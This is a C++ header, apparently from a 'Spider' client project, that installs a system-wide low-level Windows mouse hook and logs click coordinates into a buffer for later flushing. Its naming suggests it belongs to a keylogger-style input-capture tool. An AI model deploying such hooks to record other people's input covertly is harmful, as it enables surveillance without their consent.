//
// Created by etiennep on 11/8/16.
//

#ifndef SPIDER_CLIENT_WINDOWSMOUSELISTENER_HPP
#define SPIDER_CLIENT_WINDOWSMOUSELISTENER_HPP

#include "IWindowsMouseListener.hpp"

HHOOK hhkLowLevelMouse;
IWindowsMouseListener *windowsMouseListener;

class WindowsMouseListener : public IWindowsMouseListener {
public:
	WindowsMouseListener() {
		// Set global variable mendatory for hook to access appContext.
		windowsMouseListener = this;
	}

	void Run() override final
	{
		hhkLowLevelMouse = SetWindowsHookEx(WH_MOUSE_LL, LowLevelMouseProc, GetModuleHandle(nullptr), 0);
	}

	std::string Flush() override final {
		std::string result;
		for (auto const& s : _capturedInputs) { result += s; }
		_capturedInputs.clear();
		return result;
	}

	void PushMouselog(std::string &keylog) override final {
		_capturedInputs.push_back(keylog);
	}

private:
	static LRESULT CALLBACK LowLevelMouseProc(int code, WPARAM wp, LPARAM lp)
	{
		std::stringstream ss;
		std::string str;

		if (code == HC_ACTION)
		{
			MSLLHOOKSTRUCT *s_mouse = reinterpret_cast<MSLLHOOKSTRUCT*>(lp);
			switch (wp)
			{
			case WM_LBUTTONDOWN:
				ss << "[LEFTCLICK] X: " << s_mouse->pt.x << " Y: " << s_mouse->pt.y << std::endl;
				break;
			case WM_RBUTTONDOWN:
				ss << "[RIGHTCLICK] X: " << s_mouse->pt.x << " Y: " << s_mouse->pt.y << std::endl;
				break;
			default:
				break;
			}
			str = ss.str();
			windowsMouseListener->PushMouselog(str);
		}
		return CallNextHookEx(hhkLowLevelMouse, code, wp, lp);
	}

private:
	std::vector<std::string> _capturedInputs;
};

#endif //SPIDER_CLIENT_WINDOWSMOUSELISTENER_HPP